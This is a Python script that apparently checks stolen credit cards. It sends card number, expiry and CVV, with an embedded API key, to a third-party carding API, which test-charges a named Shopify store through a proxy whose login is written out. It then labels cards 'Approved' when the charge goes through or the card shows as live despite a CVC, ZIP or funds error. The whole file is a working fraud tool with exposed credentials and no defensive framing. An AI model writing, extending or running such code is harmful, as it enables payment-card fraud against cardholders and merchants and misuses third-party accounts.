import httpx

async def shopify_func(_, cc, cvv, mes, ano):
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"
    url = "https://api.voidapi.xyz/v2/shopify_graphql"

    payload = {
        "key": "VDX-SHA2X-NZ0RS-O7HAM",
        "data": {
            "card": fullcc,
            "product_url": "https://trend-couture-by-ann-manning.myshopify.com/products/flavor-singles",
            "email": None,
            "proxy": "proxy.ziny.io:1000:coopertimothy:OioZ6u9Z86O9ZVKzmBhy_country-us",
            "ship_address": None,
            "is_shippable": True
        }
    }

    try:
        async with httpx.AsyncClient(timeout=65) as client:
            res = await client.post(url, json=payload)
            response = res.json()

            status = (response.get("status") or "").lower()
            message = (response.get("message") or "").lower()
            avs = (response.get("avs_result") or "").lower()
            cvc = (response.get("cvc_result") or "").lower()

            if status == "processedreceipt":
                if "fail" in cvc:
                    return {"status": "Approved ✅", "response": "INCORRECT_CVC"}
                elif "incorrect_zip" in message or "fail" in avs:
                    return {"status": "Approved ✅", "response": "INCORRECT_ZIP"}
                else:
                    return {"status": "Approved ✅", "response": response.get("message", "Charged successfully")}

            elif "insufficient" in message:
                return {"status": "Approved ✅", "response": "INSUFFICIENT FUNDS"}

            else:
                return {
                    "status": "Declined ❌",
                    "response": response.get("error", message or "Declined or unexpected error")
                }

    except Exception as e:
        return {"status": "Error", "response": f"Request failed: {e}"}
